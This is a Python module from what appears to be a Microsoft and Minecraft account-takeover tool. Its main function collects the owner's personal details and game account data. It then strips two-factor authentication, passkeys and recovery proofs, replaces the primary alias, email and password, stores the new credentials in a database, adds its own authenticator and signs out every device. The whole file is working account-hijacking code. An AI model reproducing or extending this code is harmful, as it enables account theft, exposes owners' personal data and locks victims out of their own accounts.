from securing.utils.security_information import security_information
from securing.utils.change_primary_alias import change_primary_alias
from securing.utils.add_authenticator import add_authenticator
from securing.utils.get_recovery_code import get_recovery_code
from securing.utils.remove_services import remove_services
from securing.utils.get_owner_info import get_owner_info
from securing.utils.delete_aliases import delete_aliases
from securing.utils.remove_proof import remove_proof
from securing.utils.remove_zyger import remove_zyger
from securing.utils.get_cookies import get_cookies
from securing.utils.get_profile import get_profile
from securing.utils.remove_2fa import remove_2fa
from securing.utils.logout_all import logout_all
from securing.utils.recovery import recover
from securing.utils.get_amrp import get_amrp
from securing.utils.get_ssid import get_ssid
from securing.utils.get_amc import get_amc
from securing.utils.get_t import get_t

from minecraft.get_namechange import get_username_info
from minecraft.get_method import get_method
from minecraft.get_capes import get_capes
from minecraft.get_xbl import get_xbl

from database.database import DBConnection
import httpx
import uuid
import json

database = DBConnection()

async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
    # Main file where all processes to securing the account occur

    # To auto update if you edit the config via command
    config = json.load(open("config/config.json", "r"))
    replace_alias = config["autosecure"]["replace_main_alias"]
    enable_2fa = config["autosecure"]["enable_2fa"]
    domain = config["domain"]
    
    apicanary = await get_cookies(session) 
    
    T = await get_t(session)
    print("[+] - Found T")

    # Token needed to make API requests for the account
    verificationToken = await get_amc(session)

    # Gets account info via microsofts API
    ownerInfo = await get_owner_info(session, verificationToken)

    if ownerInfo:
        print("[+] - Got Owner Info")
        
        accountInfo["microsoft"]["firstName"] = ownerInfo["Fname"]
        accountInfo["microsoft"]["lastName"] = ownerInfo["Lname"]
        accountInfo["microsoft"]["region"] = ownerInfo["region"]
        accountInfo["microsoft"]["birthday"] = ownerInfo["birthday"]
        accountInfo["microsoft"]["fullName"] = f"{ownerInfo['Fname']} {ownerInfo['Lname']}"
    
    # Minecraft checking
    print("[~] - Checking Minecraft Account")
    XBLResponse = await get_xbl(session)

    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")

        # XBL && Token
        xbl = XBLResponse["xbl"]

        ssid = await get_ssid(xbl)
        
        # Get capes, profile and purchase method
        if ssid:    
            print("[+] - Got SSID! (Has Minecraft)")

            capes = await get_capes(ssid)
            if capes:
                accountInfo["minecraft"]["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["minecraft"]["capes"] = "No capes"

            # Gets account name
            profile = await get_profile(ssid)
            if not profile:
                print("[x] - Failed to get profile (No Minecraft Java)")
            else:
                print(f"[+] - Got profile (Has Minecraft Java)")
                accountInfo["minecraft"]["SSID"] = ssid
                accountInfo["minecraft"]["name"] = profile
                
                # Wether its changeable
                usernameInfo = await get_username_info(ssid)
                if not usernameInfo:
                    accountInfo["minecraft"]["uchange"] = "Yes"
                else:
                    accountInfo["minecraft"]["uchange"] = f"Changeable in {usernameInfo} days"

            # Minecraft purchase method
            method = await get_method(ssid)
            if method:
                accountInfo["minecraft"]["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")

    else:
        print("[x] - Failed to get XBL (Account has no Xbox Profile)")
        accountInfo["minecraft"]["name"] = "No Minecraft"

    # Security Steps
    await get_amrp(session, T)
    print("[+] - Got AMRP")

    # 2FA
    await remove_2fa(session, apicanary)

    # Pass Keys / Windows Hello Exploit
    await remove_zyger(session, apicanary)

    # Removes security_emails / Auth Apps
    await remove_proof(session, apicanary)
    print("[+] - Removed all Proofs")
    
    # Third Party Launchers (Minecraft, Prism)
    await remove_services(session)

    if recovery:

        securityParameters = json.loads(await security_information(session))
        print("[+] - Got Security Parameters")

        if securityParameters:

            # Original Email
            main_email = securityParameters["email"]
            print(f"Main EMail: {main_email}")
            encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"]

            # Changes Primary Alias
            if replace_alias:
                print("[~] - Changing Primary Alias")
                primaryEmail = f"auto{uuid.uuid4().hex[:12]}"
                change_alias = await change_primary_alias(session, primaryEmail, apicanary)
                if change_alias:
                    accountInfo["microsoft"]["email"] = f"{primaryEmail}@outlook.com"
                else:
                    print(f"[X] - Failed to change Primary Email")

            # Gets recovery code
            recovery_code = await get_recovery_code(
                session,
                apicanary,
                encryptedNetID
            )
            print(f"[+] - Got Recovery Code | {recovery_code}")
            security_email = uuid.uuid4().hex[:16]
            password = uuid.uuid4().hex[:12]

            security_email = f"{security_email}@{domain}"

            print(f"[+] - Generated Security Email ({security_email})")
            database.add_security_email(security_email, password)

            # Changes password & generate a new recovery code
            print("[~] - Automaticly Securing Account...")
            data = await recover(session, main_email, recovery_code, security_email, password)

            # Delete other login aliases
            await delete_aliases(session)

            if data and data != "invalid":
                accountInfo["microsoft"]["security_email"] = security_email
                accountInfo["microsoft"]["recovery_code"] = data["recovery_code"]
                accountInfo["microsoft"]["password"] = password
            else:
                print(f"[X] - Failed to secure this account")
    
    # Add Authenticator
    if enable_2fa:
        auth = await add_authenticator(session)
        accountInfo["microsoft"]["auth_secret"] = auth
        print(f"[+] - Added Authenticator ({auth})")
        
    # Logout all devices
    await logout_all(session, apicanary)
    print("[+] - Account has been secured")

    return accountInfo